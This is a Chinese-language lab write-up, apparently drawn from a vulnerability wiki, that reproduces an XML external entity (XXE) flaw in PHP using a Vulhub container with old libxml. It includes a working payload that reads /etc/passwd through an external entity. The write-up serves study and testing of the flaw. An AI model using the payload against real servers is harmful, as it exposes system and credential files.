---
title: "PHP 环境 XML 外部实体注入漏洞（XXE）"
date: 2026-10-22 09:18:25
categories:
  - WebSecurity
  - CVE
  - "编程语言"
  - "PHP"
tags:
  - "PHP"
  - "XXE"
  - "漏洞复现"
---
## 漏洞描述

libxml 2.9.0 以后，默认不解析外部实体，导致 XXE 漏洞逐渐消亡。为了演示 PHP 环境下的 XXE 漏洞，本例会将 libxml 2.8.0 版本编译进 PHP 中。PHP 版本并不影响 XXE 利用。

## 环境搭建

Vulhub 执行如下命令启动环境（PHP 7.0.30，libxml 2.8.0）：

```
docker compose up -d
```

环境启动后，访问 `http://your-ip:8080/index.php` 即可看到 phpinfo。

## 漏洞复现

Web 目录为 `./www`，其中包含 4 个文件：

```bash
$ tree .
.
├── dom.php # 示例：使用DOMDocument解析body
├── index.php
├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body
└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body
```

`dom.php`、`SimpleXMLElement.php`、`simplexml_load_string.php` 均可触发 XXE 漏洞，具体输出点请阅读这三个文件的代码。

Simple XXE Payload：

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/PHP%20%E7%8E%AF%E5%A2%83%20XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89/image-20240529111116223.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/language/PHP-%E7%8E%AF%E5%A2%83-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89.md)
